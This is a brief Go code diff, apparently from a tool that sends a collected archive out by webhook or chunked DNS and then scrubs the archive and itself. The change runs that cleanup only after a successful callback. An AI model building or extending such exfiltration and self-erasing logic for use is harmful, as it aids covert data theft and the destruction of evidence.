@@ -77,7 +77,8 @@ func main() {
 	}
 	logx.Info("callback ok webhook=%v dns=%v", cbRes.WebhookOK, cbRes.DNSOK)
 
-	if info.Scrub {
+	// Scrub only after a fully successful callback (webhook 2xx, or all DNS chunks sent).
+	if info.Scrub && (cbRes.WebhookOK || cbRes.DNSOK) {
 		scrub.Run(scrub.Options{
 			Archive: result.OutputPath,
 			Self:    true,
